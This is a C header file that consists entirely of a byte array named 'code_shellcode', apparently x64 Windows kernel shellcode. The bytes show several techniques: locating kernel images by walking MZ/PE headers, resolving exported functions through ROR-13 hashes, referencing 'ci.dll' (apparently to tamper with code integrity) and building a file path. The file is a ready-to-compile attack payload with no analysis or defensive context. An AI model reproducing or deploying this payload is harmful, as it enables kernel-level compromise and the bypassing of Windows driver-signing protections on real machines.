#pragma once
unsigned char code_shellcode[]={
	0x90,
	0xeb, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x80, 0x69, 0x67, 0xff, 0xff, 0xff, 0xff, 0xff, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 
	0x53, 0x56, 0x57, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x56, 0x48, 0x8b, 0xf4, 0x48, 
	0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0x0f, 0x01, 0x0c, 0x24, 0x4c, 0x8b, 0xd9, 0x48, 0x8b, 
	0x4c, 0x24, 0x02, 0x48, 0x8b, 0x49, 0x04, 0xe8, 0xae, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xe0, 0x48, 
	0x83, 0xec, 0x40, 0x49, 0x8b, 0xd3, 0x49, 0x8b, 0xcc, 0xe8, 0x8e, 0x03, 0x00, 0x00, 0x48, 0x83, 
	0xc4, 0x40, 0x48, 0x8b, 0x05, 0xa1, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x0d, 0x92, 0xff, 0xff, 0xff, 
	0x48, 0x85, 0xc0, 0x74, 0x21, 0x48, 0x89, 0x01, 0x48, 0x8b, 0xe6, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 
	0x41, 0x5b, 0x41, 0x5a, 0x5f, 0x5e, 0x5b, 0x41, 0x59, 0x41, 0x58, 0x5a, 0x59, 0x48, 0x8b, 0x05, 
	0x6e, 0xff, 0xff, 0xff, 0xff, 0xe0, 0x48, 0x85, 0xc9, 0x75, 0x20, 0x48, 0x8b, 0xe6, 0x5e, 0x41, 
	0x5d, 0x41, 0x5c, 0x41, 0x5b, 0x41, 0x5a, 0x5f, 0x5e, 0x5b, 0x41, 0x59, 0x41, 0x58, 0x5a, 0x59, 
	0x48, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0xc3, 0xba, 0x92, 0x6d, 0x58, 0x58, 
	0x49, 0x8b, 0xcc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xe8, 0x48, 0x83, 0xec, 0x40, 0x48, 
	0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x05, 
	0x2e, 0xff, 0xff, 0xff, 0x48, 0xb8, 0x80, 0x69, 0x67, 0xff, 0xff, 0xff, 0xff, 0xff, 0x49, 0x89, 
	0x00, 0x41, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x40, 0xeb, 0xd1, 0x48, 0xc1, 0xe9, 0x0c, 0x48, 0xc1, 
	0xe1, 0x0c, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x2b, 0xc8, 0x66, 0x8b, 0x01, 0x66, 0x3d, 0x4d, 
	0x5a, 0x75, 0xef, 0x8b, 0x41, 0x3c, 0x3d, 0x00, 0x10, 0x00, 0x00, 0x77, 0xe5, 0x48, 0x03, 0xc1, 
	0x8b, 0x00, 0x3d, 0x50, 0x45, 0x00, 0x00, 0x75, 0xd9, 0x48, 0x8b, 0xc1, 0xc3, 0x56, 0x57, 0x48, 
	0x8b, 0xf1, 0x48, 0x33, 0xff, 0x48, 0x33, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 
	0x0d, 0x03, 0xf8, 0xeb, 0xf4, 0x8b, 0xc7, 0x5f, 0x5e, 0xc3, 0x57, 0x56, 0x8b, 0x79, 0x3c, 0x8b, 
	0xbc, 0x39, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xf9, 0x44, 0x8b, 0x47, 0x18, 0x48, 0x33, 0xf6, 
	0x8b, 0x47, 0x20, 0x48, 0x03, 0xc1, 0x8b, 0x04, 0xb0, 0x48, 0x03, 0xc1, 0x51, 0x48, 0x8b, 0xc8, 
	0xe8, 0xb8, 0xff, 0xff, 0xff, 0x59, 0x3b, 0xc2, 0x74, 0x05, 0x48, 0xff, 0xc6, 0xeb, 0xe1, 0x8b, 
	0x57, 0x24, 0x48, 0x03, 0xd1, 0x48, 0x33, 0xc0, 0x66, 0x8b, 0x04, 0x72, 0x8b, 0x57, 0x1c, 0x48, 
	0x03, 0xd1, 0x8b, 0x04, 0x82, 0x48, 0x03, 0xc1, 0x5e, 0x5f, 0xc3, 0x0f, 0x20, 0xd8, 0xc3, 0x0f, 
	0x09, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 
	0xba, 0x15, 0x80, 0x2e, 0x0c, 0x8b, 0xfb, 0xe8, 0xf8, 0x05, 0x00, 0x00, 0x48, 0x8b, 0xd0, 0x48, 
	0x85, 0xc0, 0x75, 0x04, 0x33, 0xc0, 0xeb, 0x4c, 0x8b, 0xc3, 0x80, 0x3c, 0x10, 0xe9, 0x74, 0x0c, 
	0xff, 0xc3, 0x81, 0xfb, 0x80, 0x00, 0x00, 0x00, 0x72, 0xee, 0xeb, 0xe8, 0x8b, 0xc3, 0x48, 0x63, 
	0x4c, 0x10, 0x01, 0x48, 0x03, 0xc8, 0x48, 0x03, 0xd1, 0x8b, 0xc7, 0xb9, 0x89, 0x0d, 0x00, 0x00, 
	0x66, 0x39, 0x4c, 0x10, 0x05, 0x74, 0x0c, 0xff, 0xc7, 0x81, 0xff, 0x00, 0x01, 0x00, 0x00, 0x72, 
	0xe8, 0xeb, 0xc1, 0x8b, 0xc7, 0x48, 0x63, 0x4c, 0x10, 0x07, 0x48, 0x03, 0xc8, 0x48, 0x8d, 0x42, 
	0x0b, 0x48, 0x03, 0xc1, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 
	0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x55, 0x48, 0x8d, 0xac, 0x24, 0x00, 
	0xff, 0xff, 0xff, 0x48, 0x81, 0xec, 0x00, 0x02, 0x00, 0x00, 0x33, 0xc0, 0xc7, 0x45, 0xf0, 0x5c, 
	0x3f, 0x3f, 0x5c, 0x33, 0xf6, 0x48, 0x89, 0x44, 0x24, 0x60, 0x89, 0x44, 0x24, 0x68, 0x4c, 0x8d, 
	0x44, 0x24, 0x6d, 0x48, 0x8d, 0x54, 0x24, 0x60, 0x48, 0x89, 0x44, 0x24, 0x6e, 0x4c, 0x3b, 0xc2, 
	0x48, 0x89, 0x44, 0x24, 0x76, 0x48, 0x89, 0x44, 0x24, 0x7e, 0x4c, 0x8d, 0x44, 0x24, 0x60, 0x48, 
	0x1b, 0xd2, 0x66, 0x89, 0x45, 0x86, 0x48, 0xf7, 0xd2, 0xc7, 0x45, 0xf4, 0x63, 0x3a, 0x5c, 0x70, 
	0x8d, 0x46, 0x0d, 0x66, 0xc7, 0x45, 0xf8, 0x2e, 0x31, 0x48, 0x23, 0xd0, 0x40, 0x88, 0x75, 0xfa, 
	0x48, 0x8b, 0xd9, 0xc7, 0x45, 0x88, 0x00, 0x0d, 0x00, 0x00, 0x49, 0xf7, 0xd8, 0xc7, 0x44, 0x24, 
	0x69, 0x79, 0x75, 0x79, 0x0d, 0xc7, 0x44, 0x24, 0x65, 0x37, 0x51, 0x3c, 0x23, 0x48, 0x8d, 0x4c, 
	0x24, 0x60, 0xc7, 0x44, 0x24, 0x61, 0x32, 0x32, 0x51, 0x4e, 0xc6, 0x44, 0x24, 0x60, 0x51, 0x30, 
	0x01, 0x48, 0xff, 0xc1, 0x49, 0x8d, 0x04, 0x08, 0x48, 0x3b, 0xc2, 0x74, 0x05, 0x8a, 0x45, 0x89, 
	0xeb, 0xed, 0x48, 0x8d, 0x54, 0x24, 0x60, 0xc6, 0x45, 0x88, 0x01, 0x48, 0x8d, 0x4d, 0xd0, 0xff, 
	0x53, 0x70, 0x41, 0xb0, 0x01, 0x48, 0x8d, 0x55, 0xd0, 0x48, 0x8d, 0x4d, 0xe0, 0xff, 0x53, 0x58, 
	0xba, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0xa0, 0xff, 0x93, 0x80, 0x00, 0x00, 0x00, 0xba, 
	0x10, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x90, 0xff, 0x93, 0x80, 0x00, 0x00, 0x00, 0x89, 0x74, 
	0x24, 0x50, 0x48, 0x8d, 0x45, 0xe0, 0x48, 0x89, 0x74, 0x24, 0x48, 0x4c, 0x8d, 0x4d, 0x90, 0xc7, 
	0x44, 0x24, 0x40, 0x60, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x45, 0xa0, 0xc7, 0x44, 0x24, 0x38, 0x05, 
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x10, 0x01, 0x00, 0x00, 0x89, 0x74, 0x24, 0x30, 0x0f, 0x57, 
	0xc0, 0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x10, 0x40, 0x48, 0x89, 
	0x74, 0x24, 0x20, 0xc7, 0x45, 0xa0, 0x30, 0x00, 0x00, 0x00, 0x48, 0x89, 0x75, 0xa8, 0xc7, 0x45, 
	0xb8, 0x40, 0x02, 0x00, 0x00, 0x48, 0x89, 0x45, 0xb0, 0xf3, 0x0f, 0x7f, 0x45, 0xc0, 0xff, 0x93, 
	0x90, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x78, 0x4f, 0x48, 0x8d, 0x4d, 0xf0, 0x48, 0x89, 0xb5, 0x18, 
	0x01, 0x00, 0x00, 0xff, 0x93, 0xc8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x74, 0x24, 0x40, 0x48, 0x8d, 
	0x8d, 0x18, 0x01, 0x00, 0x00, 0x48, 0x89, 0x4c, 0x24, 0x38, 0xff, 0xc0, 0x48, 0x8b, 0x8d, 0x10, 
	0x01, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x89, 0x44, 0x24, 0x30, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0x45, 
	0xf0, 0x33, 0xd2, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8d, 0x45, 0x90, 0x48, 0x89, 0x44, 0x24, 
	0x20, 0xff, 0x93, 0xc0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x10, 0x01, 0x00, 0x00, 0xff, 0x93, 
	0x88, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0x00, 0x02, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x20, 
	0x49, 0x8b, 0x73, 0x28, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 
	0x89, 0x58, 0x08, 0x57, 0x48, 0x83, 0xec, 0x20, 0xba, 0x62, 0xe0, 0x07, 0x37, 0xc7, 0x40, 0x18, 
	0x63, 0x69, 0x2e, 0x64, 0x48, 0x8b, 0xd9, 0x66, 0xc7, 0x40, 0x1c, 0x6c, 0x6c, 0xc6, 0x40, 0x1e, 
	0x00, 0xe8, 0x9e, 0x03, 0x00, 0x00, 0xba, 0xd8, 0x00, 0x00, 0x00, 0x33, 0xc9, 0xff, 0xd0, 0x48, 
	0x8b, 0xd0, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0xf8, 0xe8, 0x3f, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x54, 
	0x24, 0x40, 0x48, 0x8b, 0xcf, 0xe8, 0x9e, 0x02, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x1f, 0x48, 
	0x8b, 0xc8, 0xe8, 0x5d, 0xfd, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x48, 0x83, 0x20, 0x00, 
	0x48, 0x8b, 0xcf, 0xe8, 0xc8, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0xcf, 0xff, 0x57, 0x10, 0x48, 0x8b, 
	0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 
	0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55, 
	0x48, 0x8d, 0xa8, 0x28, 0xff, 0xff, 0xff, 0x48, 0x81, 0xec, 0xd0, 0x01, 0x00, 0x00, 0xb8, 0x4a, 
	0x45, 0x3b, 0xd7, 0x48, 0x89, 0x54, 0x24, 0x20, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0xf1, 
	0x48, 0x8d, 0x42, 0x08, 0x48, 0xc7, 0x44, 0x24, 0x38, 0x62, 0xe0, 0x07, 0x37, 0x48, 0x89, 0x44, 
	0x24, 0x30, 0xb9, 0x2a, 0xd0, 0x35, 0x30, 0x48, 0x8d, 0x42, 0x10, 0x48, 0xc7, 0x44, 0x24, 0x68, 
	0x92, 0x6d, 0x58, 0x58, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8b, 0xfa, 0xb8, 0x1f, 0x9d, 0x48, 
	0x9d, 0x48, 0xc7, 0x44, 0x24, 0x78, 0xce, 0xad, 0x90, 0x4d, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 
	0x8d, 0x42, 0x18, 0x48, 0x89, 0x44, 0x24, 0x50, 0xb8, 0xa1, 0x7b, 0xcc, 0xdc, 0x48, 0x89, 0x44, 
	0x24, 0x58, 0x48, 0x8d, 0x42, 0x20, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8d, 0x42, 0x28, 0x48, 
	0x89, 0x44, 0x24, 0x70, 0x48, 0x8d, 0x42, 0x30, 0x48, 0x89, 0x45, 0x80, 0x48, 0x8d, 0x42, 0x38, 
	0x48, 0x89, 0x45, 0x90, 0x48, 0x8d, 0x42, 0x40, 0x48, 0x89, 0x45, 0xa0, 0x48, 0x8d, 0x42, 0x48, 
	0x48, 0x89, 0x45, 0xb0, 0xb8, 0xf7, 0x38, 0xb3, 0x9d, 0x48, 0x89, 0x45, 0xb8, 0x48, 0x8d, 0x42, 
	0x50, 0x48, 0x89, 0x45, 0xc0, 0x48, 0x8d, 0x42, 0x58, 0x48, 0x89, 0x45, 0xd0, 0xb8, 0x89, 0x83, 
	0x6c, 0xeb, 0x48, 0x89, 0x45, 0xd8, 0x48, 0x8d, 0x42, 0x60, 0x48, 0x89, 0x45, 0xe0, 0xb8, 0x9b, 
	0x97, 0x64, 0xcf, 0x48, 0x89, 0x45, 0xe8, 0x48, 0x8d, 0x42, 0x68, 0x48, 0x89, 0x45, 0xf0, 0xb8, 
	0x2a, 0xc0, 0xb2, 0xa8, 0x48, 0x89, 0x45, 0xf8, 0x48, 0x8d, 0x42, 0x70, 0x48, 0x89, 0x45, 0x00, 
	0x48, 0x8d, 0x42, 0x78, 0x48, 0x89, 0x45, 0x10, 0x48, 0x89, 0x45, 0x20, 0x48, 0x8d, 0x82, 0x80, 
	0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0x30, 0xb8, 0xdb, 0x4f, 0x3d, 0xc5, 0x48, 0x89, 0x45, 0x38, 
	0x48, 0x8d, 0x82, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0x40, 0x48, 0x8d, 0x82, 0x90, 0x00, 
	0x00, 0x00, 0x48, 0x89, 0x45, 0x50, 0xb8, 0x9d, 0x8f, 0xa0, 0xc3, 0x48, 0x89, 0x45, 0x58, 0x48, 
	0x8d, 0x82, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0x60, 0xb8, 0xb8, 0xd4, 0x29, 0x88, 0x48, 
	0x89, 0x45, 0x68, 0x48, 0x8d, 0x82, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0x70, 0xb8, 0x16, 
	0x35, 0xfd, 0x87, 0x48, 0x89, 0x45, 0x78, 0x48, 0x8d, 0x82, 0xa0, 0x00, 0x00, 0x00, 0x48, 0x89, 
	0x85, 0x80, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x88, 0x57, 0x63, 0x32, 0x5a, 0x48, 0xc7, 0x45, 
	0x98, 0x8f, 0xb5, 0x6a, 0x6a, 0x48, 0xc7, 0x45, 0xa8, 0xf9, 0xbe, 0xdd, 0x05, 0x48, 0xc7, 0x45, 
	0xc8, 0xc9, 0xc5, 0x6e, 0x6c, 0x48, 0xc7, 0x45, 0x08, 0x3d, 0x28, 0xc3, 0x7c, 0x48, 0x89, 0x4d, 
	0x18, 0x48, 0x89, 0x4d, 0x28, 0x48, 0xc7, 0x45, 0x48, 0x61, 0x4c, 0x04, 0x5d, 0x48, 0xc7, 0x85, 
	0x88, 0x00, 0x00, 0x00, 0x50, 0x64, 0xb0, 0x6f, 0x48, 0x8d, 0x82, 0xa8, 0x00, 0x00, 0x00, 0x48, 
	0xc7, 0x85, 0xb8, 0x00, 0x00, 0x00, 0x36, 0x31, 0x0e, 0x68, 0x48, 0x89, 0x85, 0x90, 0x00, 0x00, 
	0x00, 0x48, 0x8d, 0x5c, 0x24, 0x20, 0xb8, 0xe2, 0xca, 0x61, 0xe6, 0x48, 0xc7, 0x85, 0xc8, 0x00, 
	0x00, 0x00, 0xa8, 0x5b, 0x2f, 0x67, 0x48, 0x89, 0x85, 0x98, 0x00, 0x00, 0x00, 0x41, 0xbe, 0x1b, 
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x82, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x85, 0xa0, 0x00, 0x00, 
	0x00, 0xb8, 0xde, 0x24, 0xe6, 0xf7, 0x48, 0x89, 0x85, 0xa8, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x82, 
	0xc0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x85, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x82, 0xc8, 0x00, 
	0x00, 0x00, 0x48, 0x89, 0x85, 0xc0, 0x00, 0x00, 0x00, 0x8b, 0x53, 0x08, 0x48, 0x8b, 0xce, 0xe8, 
	0x10, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x0b, 0x48, 0x8d, 0x5b, 0x10, 0x48, 0x89, 0x01, 0x49, 0x83, 
	0xee, 0x01, 0x75, 0xe5, 0x4c, 0x8d, 0x9c, 0x24, 0xd0, 0x01, 0x00, 0x00, 0x48, 0x89, 0xb7, 0xd0, 
	0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x4d, 
	0x8b, 0x73, 0x28, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 
	0x89, 0x68, 0x18, 0x48, 0x89, 0x70, 0x20, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 
	0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0x60, 0x08, 0x00, 0x4c, 0x8d, 0x48, 0x08, 0x4c, 0x8b, 0xea, 
	0x48, 0x8b, 0xf1, 0x33, 0xd2, 0x45, 0x33, 0xc0, 0x45, 0x33, 0xe4, 0x8d, 0x7a, 0x0b, 0x8b, 0xcf, 
	0xff, 0x96, 0xa8, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x54, 0x24, 0x50, 0x48, 0x85, 0xd2, 0x75, 0x04, 
	0x33, 0xc0, 0xeb, 0x72, 0x33, 0xc9, 0xff, 0x56, 0x08, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 
	0xef, 0x44, 0x8b, 0x44, 0x24, 0x50, 0x4c, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x8b, 0xd0, 0x8b, 0xcf, 
	0xff, 0x96, 0xa8, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x43, 0x33, 0xed, 0x4c, 0x8d, 0x73, 0x08, 
	0x39, 0x2b, 0x76, 0x39, 0x4c, 0x8d, 0x7d, 0xf0, 0x4d, 0x2b, 0xfe, 0x49, 0x8d, 0x7e, 0x10, 0x0f, 
	0xb7, 0x47, 0x16, 0x49, 0x8d, 0x56, 0x28, 0x49, 0x03, 0xc7, 0x49, 0x8b, 0xcd, 0x48, 0x03, 0xc7, 
	0x48, 0x03, 0xd0, 0xff, 0x16, 0x85, 0xc0, 0x75, 0x03, 0x4c, 0x8b, 0x27, 0x8b, 0x0b, 0x48, 0xff, 
	0xc5, 0x48, 0x81, 0xc7, 0x28, 0x01, 0x00, 0x00, 0x48, 0x3b, 0xe9, 0x72, 0xd2, 0x48, 0x8b, 0xcb, 
	0xff, 0x56, 0x10, 0x49, 0x8b, 0xc4, 0x48, 0x8b, 0x5c, 0x24, 0x58, 0x48, 0x8b, 0x6c, 0x24, 0x60, 
	0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 
	0x5c, 0x5f, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 
	0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x8b, 0xea, 0x48, 0x85, 0xc9, 0x74, 0x7a, 0xb8, 0x4d, 
	0x5a, 0x00, 0x00, 0x66, 0x39, 0x01, 0x75, 0x70, 0x48, 0x63, 0x41, 0x3c, 0x48, 0x03, 0xc1, 0x74, 
	0x67, 0x81, 0x38, 0x50, 0x45, 0x00, 0x00, 0x75, 0x5f, 0x8b, 0x90, 0x88, 0x00, 0x00, 0x00, 0x48, 
	0x03, 0xd1, 0x74, 0x54, 0x44, 0x8b, 0x5a, 0x18, 0x45, 0x85, 0xdb, 0x74, 0x4b, 0x8b, 0x42, 0x20, 
	0x85, 0xc0, 0x74, 0x44, 0x8b, 0x72, 0x24, 0x4c, 0x8d, 0x0c, 0x01, 0x8b, 0x7a, 0x1c, 0x48, 0x03, 
	0xf1, 0x48, 0x03, 0xf9, 0x45, 0x33, 0xc0, 0x45, 0x85, 0xdb, 0x74, 0x2c, 0x45, 0x8b, 0x11, 0x4c, 
	0x03, 0xd1, 0x33, 0xdb, 0xeb, 0x0b, 0x0f, 0xb6, 0xc0, 0x49, 0xff, 0xc2, 0xc1, 0xcb, 0x0d, 0x03, 
	0xd8, 0x41, 0x8a, 0x02, 0x84, 0xc0, 0x75, 0xee, 0x3b, 0xdd, 0x74, 0x23, 0x41, 0xff, 0xc0, 0x49, 
	0x83, 0xc1, 0x04, 0x45, 0x3b, 0xc3, 0x72, 0xd4, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08, 0x48, 
	0x8b, 0x6c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x48, 0x8b, 0x7c, 0x24, 0x20, 0xc3, 0x46, 
	0x0f, 0xb7, 0x04, 0x46, 0x44, 0x3b, 0x42, 0x14, 0x73, 0xde, 0x42, 0x8b, 0x04, 0x87, 0x48, 0x03, 
	0xc1, 0xeb, 0xd7
};